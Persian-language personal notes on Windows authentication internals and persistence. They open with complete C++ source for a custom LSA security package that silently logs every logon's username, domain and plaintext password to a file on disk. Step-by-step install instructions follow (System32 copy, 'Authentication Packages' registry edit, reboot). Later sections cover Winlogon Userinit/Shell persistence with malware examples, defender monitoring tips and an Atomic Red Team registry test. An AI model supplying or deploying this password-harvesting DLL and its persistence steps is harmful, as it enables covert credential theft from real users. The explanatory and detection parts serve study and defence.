
```c++
#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <string>

// تعریف پروتوتایپ توابع مورد نیاز LSA
extern "C" {
    NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable);
    NTSTATUS NTAPI SpShutDown(void);
    NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo);
    NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CREDENTIAL PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CREDENTIAL SupplementalCredentials);
    __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables);
}

// مقداردهی جدول توابع (فقط توابعی که نیاز داریم را متصل می‌کنیم و بقیه NULL می‌مانند)
SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = {
    {
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
        SpInitialize,   // [8] Initialize
        SpShutDown,     // [9] Shutdown
        SpGetInfo,      // [10] GetInfo
        SpAcceptCredentials, // [11] AcceptCredentials
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};

// تابع نقطه ورود که توسط پروسه lsass.exe فراخوانی می‌شود
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(
    ULONG LsaVersion,
    PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE* ppTables,
    PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;
    return STATUS_SUCCESS;
}

// تابع مقداردهی اولیه پکیج
NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    return STATUS_SUCCESS;
}

// تابع خاتمه کار پکیج
NTSTATUS NTAPI SpShutDown(void)
{
    return STATUS_SUCCESS;
}

// ارائه اطلاعات پکیج به LSA (این مقادیر برای رجیستر شدن موفق ضروری هستند)
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->Name = (SEC_WCHAR*)L"CustomSSP";
    PackageInfo->Comment = (SEC_WCHAR*)L"Custom Authentication Package";
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion = 1;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    return STATUS_SUCCESS;
}

// تابع رهگیری و ثبت اعتبارنامه‌ها (Credentials)
NTSTATUS NTAPI SpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType,
    PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CREDENTIAL PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CREDENTIAL SupplementalCredentials)
{
    // بررسی اینکه آیا اطلاعات معتبر هستند یا خیر
    if (!AccountName || !PrimaryCredentials) {
        return STATUS_SUCCESS;
    }

    // استخراج اطلاعات. استفاده از Length ضروری است زیرا UNICODE_STRING لزوما Null-Terminated نیست.
    std::wstring account(AccountName->Buffer, AccountName->Length / sizeof(WCHAR));
    std::wstring domain(PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length / sizeof(WCHAR));
    std::wstring password(PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length / sizeof(WCHAR));

    // ساختاربندی لاگ
    std::wstring log = account + L"@" + domain + L":" + password + L"\n";

    // باز کردن فایل لاگ و نوشتن در آن
    HANDLE outFile = CreateFile(
        L"c:\\temp\\logged-pw.txt", 
        FILE_GENERIC_WRITE, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (outFile != INVALID_HANDLE_VALUE) {
        // انتقال نشانگر فایل به انتها برای جلوگیری از Overwrite شدن رکوردهای قبلی
        SetFilePointer(outFile, 0, NULL, FILE_END);
        
        DWORD bytesWritten = 0;
        // نوشتن به صورت Unicode (UTF-16 LE)
        WriteFile(outFile, log.c_str(), static_cast<DWORD>(log.length() * sizeof(WCHAR)), &bytesWritten, NULL);
        CloseHandle(outFile);
    }

    return STATUS_SUCCESS;
}

```


1. **مدیریت ایمن `UNICODE_STRING`:** در محیط کرنل و `lsass.exe`، فیلد `Buffer` در استراکچر `UNICODE_STRING` غالباً با `NULL` پایان نمی‌یابد (`\0`). اگر مستقیم آن را به `std::wstring` بدهید، پروسه `lsass.exe` کرش کرده و سیستم **Blue Screen (BSOD)** می‌دهد. برای حل این مشکل، از پارامتر طول `(Length / sizeof(WCHAR))` در سازنده رشته استفاده شد.
2. **افزودن `SetFilePointer`:** در کد شما فایل با `OPEN_ALWAYS` باز می‌شد اما مکان‌نما (Cursor) در ابتدای فایل قرار داشت. این باعث می‌شد لاگ‌های جدید روی لاگ‌های قبلی نوشته شوند (Overwrite). تابع `SetFilePointer` اضافه شد تا متن جدید در انتهای فایل (Append) قرار گیرد.
3. **تکمیل `SECPKG_FUNCTION_TABLE`:** آرایه توابع نیاز داشت که با فرمت دقیق پکیج‌های امنیتی مپ شود. جایگاه توابع `SpInitialize`، `SpShutDown`، `SpGetInfo` و `SpAcceptCredentials` دقیقاً در اندیس‌های تعیین‌شده در ساختار LSA قرار داده شد.
4. **پیاده‌سازی `SpGetInfo`:** سرویس LSA برای اینکه پکیج شما را لود کند، نیاز دارد اطلاعات آن (نام و قابلیت‌ها) را بخواند. تابع `SpGetInfo` برای بازگرداندن این اطلاعات پیاده‌سازی شد.

### نکات مهم برای کامپایل و پیاده‌سازی:

- **نوع پروژه:** این کد باید به صورت یک **DLL** پویا (Dynamic Link Library) با معماری مطابق با ویندوز هدف (غالباً **x64**) کامپایل شود.
- **نصب در LSA:** برای اینکه سیستم‌عامل این DLL را به داخل `lsass.exe` تزریق کند، فایل کامپایل‌شده باید در مسیر `C:\Windows\System32` قرار گیرد.
- **تغییرات رجیستری:** باید نام فایل DLL (بدون پسوند) را در مسیر رجیستری زیر به انتهای مقادیر مقدار `Authentication Packages` اضافه کنید:`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
- **ری‌استارت سیستم:** پس از اعمال تغییرات در رجیستری، سیستم باید یک بار راه‌اندازی مجدد (Reboot) شود تا DLL در حافظه قرار گیرد.

![[Pasted image 20260223192635.png]]


_توجه: اجرای کدهایی که مستقیماً با پروسه `lsass.exe` تعامل دارند بسیار حساس است. هرگونه باگ در این DLL منجر به راه‌اندازی مجدد اجباری ویندوز خواهد شد. استفاده از این ابزارها باید صرفاً جهت مقاصد تست نفوذ مجاز یا مانیتورینگ سیستم‌های تحت مالکیت قانونی صورت گیرد._





# 🧠 تصویر کلی احراز هویت در ویندوز

وقتی سیستم بالا میاد، این زنجیره شکل می‌گیره:

```
Winlogon
   ↓
LogonUI
   ↓
Credential Provider
   ↓
LSASS
   ↓
Authentication Package
   ↓
(SAM یا Active Directory)
```

حالا تک‌تک این‌ها رو کالبدشکافی می‌کنیم.

---

# 1️⃣ Winlogon چیست؟

Winlogon

یک پروسه سیستمی است که:

- هنگام Ctrl+Alt+Del فعال می‌شود
    
- Session logon/logout را مدیریت می‌کند
    
- بعد از احراز هویت، shell کاربر (explorer.exe) را اجرا می‌کند
    

Winlogon خودش پسورد را بررسی نمی‌کند.  
فقط orchestration انجام می‌دهد.

---

# 2️⃣ LogonUI چیست؟

LogonUI.exe

این همان صفحه‌ای است که:

- یوزرنیم
    
- پسورد
    
- PIN
    
- Windows Hello
    

را نشان می‌دهد.

اما LogonUI هم authentication انجام نمی‌دهد.  
فقط UI است.

---

# 3️⃣ Credential Provider چیست؟

Credential Provider یک COM component است که:

- تعیین می‌کند چه نوع credentialی قابل ورود است
    
- UI مربوط به آن را تولید می‌کند
    

مثلاً:

- Password
    
- Smart Card
    
- PIN
    
- Windows Hello
    

Credential Provider:

- داده را از کاربر می‌گیرد
    
- آن را به LSASS می‌فرستد
    

---

# 4️⃣ LSASS چیست؟

Local Security Authority Subsystem Service

پروسه:

```
lsass.exe
```

این مغز امنیت ویندوز است.

وظایف:

- احراز هویت
    
- ساخت access token
    
- نگهداری credential ها
    
- اجرای authentication packages
    

---

# 5️⃣ Authentication Package چیست؟

Authentication Package یک ماژول داخل LSASS است که منطق واقعی بررسی credential را انجام می‌دهد.

مثال‌ها:

- MSV1_0 → NTLM
    
- Kerberos → Kerberos
    
- Negotiate (انتخاب خودکار)
    

---

# 📌 حالا Flow واقعی را دقیق ببینیم

## حالت 1️⃣ Local Account

کاربر:

```
username + password
```

جریان:

```
LogonUI
  ↓
Credential Provider
  ↓
LSASS
  ↓
MSV1_0 Authentication Package
  ↓
SAM Database
```

Security Account Manager

پسورد:

- hash می‌شود
    
- با hash ذخیره‌شده در SAM مقایسه می‌شود
    

اگر match شود:

✔ Access Token ساخته می‌شود  
✔ Winlogon shell را اجرا می‌کند

---

## حالت 2️⃣ Domain Account

کاربر:

```
user@domain
```

Flow:

```
LogonUI
  ↓
Credential Provider
  ↓
LSASS
  ↓
Kerberos Authentication Package
  ↓
Domain Controller
```

Active Directory

و روی شبکه می‌رود به:

Domain Controller

Kerberos:

1. AS-REQ می‌فرستد
    
2. TGT می‌گیرد
    
3. Ticket می‌سازد
    

اگر موفق شد:

✔ Token ساخته می‌شود  
✔ SID های گروه‌های دامین اضافه می‌شود

---

# 🎟 Access Token دقیقاً چیست؟

Access Token شامل:

- SID کاربر
    
- SID گروه‌ها
    
- Privilege ها (SeDebugPrivilege و غیره)
    
- Integrity Level
    

هر process ای که اجرا شود، این token را به ارث می‌برد.

---

# 🔐 حالا Credential Provider دقیق‌تر

Credential Provider فقط UI نیست.  
یک interface COM است:

```
ICredentialProvider
ICredentialProviderCredential
```

کارش:

- گرفتن ورودی
    
- serialize کردن credential
    
- دادن آن به LSASS
    

LSASS خودش با Credential Provider مستقیماً حرف نمی‌زند — از طریق Winlogon واسطه می‌شود.

---

# 🔥 تفاوت Credential Provider و Authentication Package

|Credential Provider|Authentication Package|
|---|---|
|در user mode|در LSASS|
|UI layer|Logic layer|
|COM based|SECPKG based|
|ورودی می‌گیرد|اعتبارسنجی می‌کند|

---

# 🧬 ساختار داخلی Authentication Package

Authentication Package داخل LSASS این export را دارد:

```
SpLsaModeInitialize
```

و جدول توابع:

```
SpInitialize
SpAcceptCredentials
SpGetInfo
```

LSASS وقتی credential جدید می‌گیرد:

```
LsaLogonUser()
```

را صدا می‌زند  
و بسته به نوع logon، package مربوطه را dispatch می‌کند.

---

# 🧠 چیزی که اکثر افراد نمی‌دانند

LSASS:

- Credential را plaintext نگه نمی‌دارد
    
- بلکه structure شده در memory دارد
    
- و در Kerberos، ticket ها در memory cache هستند
    

به همین دلیل ابزارهایی مثل Mimikatz می‌توانند از حافظه dump بگیرند.

---

# 🛡 اگر Defender باشی باید کجا را مانیتور کنی؟

1. LSASS memory access
    
2. LsaRegisterLogonProcess
    
3. تغییر Authentication Package در رجیستری
    
4. Credential Provider جدید
    

---

# 🎯 جمع‌بندی خیلی دقیق

وقتی کاربر پسورد می‌زند:

1. Winlogon session را مدیریت می‌کند
    
2. LogonUI UI را نمایش می‌دهد
    
3. Credential Provider داده را می‌گیرد
    
4. LSASS آن را دریافت می‌کند
    
5. Authentication Package اعتبارسنجی می‌کند
    
6. اگر موفق شد → Access Token ساخته می‌شود
    
7. Explorer اجرا می‌شود
    


---

# 🧠 بعد از موفقیت احراز هویت چه اتفاقی می‌افتد؟

وقتی LSASS موفق شد:

- یک **Access Token** می‌سازه
- آن را به Winlogon برمی‌گرداند

حالا نوبت Winlogon است که session کاربر را بالا بیاورد.

entity["software","Winlogon","windows logon process"]

---

# 📍 کلید رجیستری Winlogon

مسیر اصلی:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

این کلید تعیین می‌کند:

- بعد از لاگین چه برنامه‌ای اجرا شود
- چه چیزی محیط کاربر را بسازد

دو مقدار مهم که گفتی:

```
Userinit
Shell
```

---

# 1️⃣ Userinit چیست؟

مقدار پیش‌فرض:

```
C:\Windows\System32\userinit.exe,
```

(دقت کن کاما آخر مهم است)

## نقش userinit.exe چیست؟

entity["software","userinit.exe","windows user initialization process"]

کارهایش:

1. اجرای logon script
2. اتصال به network drives
3. تنظیم environment variables
4. در نهایت اجرای shell

یعنی userinit واسطه بین Winlogon و shell است.

---

### Flow واقعی:

```
Winlogon
   ↓
userinit.exe
   ↓
Shell (explorer.exe)
```

---

# 2️⃣ Shell چیست؟

مقدار پیش‌فرض:

```
explorer.exe
```

entity["software","explorer.exe","windows shell"]

Shell یعنی محیط گرافیکی ویندوز:

- Taskbar
- Desktop
- Start Menu
- File Explorer

اگر این مقدار را تغییر بدهی:

مثلاً:

```
Shell = cmd.exe
```

کاربر بعد از لاگین مستقیم وارد cmd می‌شود 😄

---

# 🔬 چرا userinit مستقیماً explorer را اجرا نمی‌کند؟

در واقع می‌کند — اما به صورت configurable.

مکانیزم:

1. Winlogon → CreateProcess(userinit.exe, token)
2. userinit → رجیستری را می‌خواند
3. مقدار Shell را می‌گیرد
4. آن را با token کاربر اجرا می‌کند
5. خودش terminate می‌شود

پس:

- Winlogon فقط userinit را اجرا می‌کند
- userinit مسئول اجرای shell است

---

# ⚠️ چرا این کلیدها مهم‌اند؟

چون محل کلاسیک persistence هستند.

اگر کسی این را تغییر دهد:

```
Userinit = userinit.exe, malware.exe
```

یا

```
Shell = malware.exe
```

هر بار کاربر لاگین کند، malware اجرا می‌شود.

---

# 🛡 از دید Defender

EDR باید:

- تغییرات این کلید رجیستری را مانیتور کند
- Parent/child relationship را بررسی کند

Flow نرمال:

```
winlogon.exe
   └── userinit.exe
         └── explorer.exe
```

اگر ببینی:

```
winlogon.exe
   └── powershell.exe
```

یا

```
userinit.exe
   └── suspicious.exe
```

این high alert است.

---

# 🧠 یک نکته حرفه‌ای (Windows Internals Level)

Winlogon:

- داخل session 1 اجرا می‌شود
- با SYSTEM privilege
- مسئول Secure Attention Sequence (Ctrl+Alt+Del) است

Explorer:

- با توکن کاربر اجرا می‌شود
- نه SYSTEM

پس privilege boundary اینجاست.

---

# 🔎 تفاوت HKLM و HKCU

Winlogon کلید Shell را از:

```
HKLM\...\Winlogon
```

می‌خواند

اما Explorer می‌تواند per-user هم override داشته باشد.

---

# 🎯 جمع‌بندی خیلی دقیق

| مرحله | چه کسی اجرا می‌کند | با چه سطحی |
|--------|-------------------|------------|
| احراز هویت | LSASS | SYSTEM |
| ساخت Session | Winlogon | SYSTEM |
| اجرای Userinit | Winlogon | User Token |
| اجرای Explorer | userinit | User Token |

---

# 🔥 چیزی که معمولاً کسی توضیح نمی‌دهد

اگر explorer crash شود:

Winlogon دوباره آن را اجرا نمی‌کند.  
Explorer خودش self-restart دارد.

---


# T1547.002 - Authentication Package

## Description from ATT&CK

> Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)
> 
> Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.

[Source](https://attack.mitre.org/techniques/T1547/002)

## Atomic Tests

- [Atomic Test #1: Authentication Package](#atomic-test-1-authentication-package)

### Atomic Test #1: Authentication Package

Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
After a reboot, Notepad.exe will be executed as child process of lsass.exe.
Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)

**Supported Platforms:** Windows

**auto_generated_guid:** `be2590e8-4ac3-47ac-b4b5-945820f2fbe9`

#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)

```powershell
Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
```

#### Cleanup Commands

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
rm -force C:\windows\system32\package.dll
```


----


# DACl
# SACL

[[Persistence using ACLs -Rights Abuse]]
[[ACL API]]

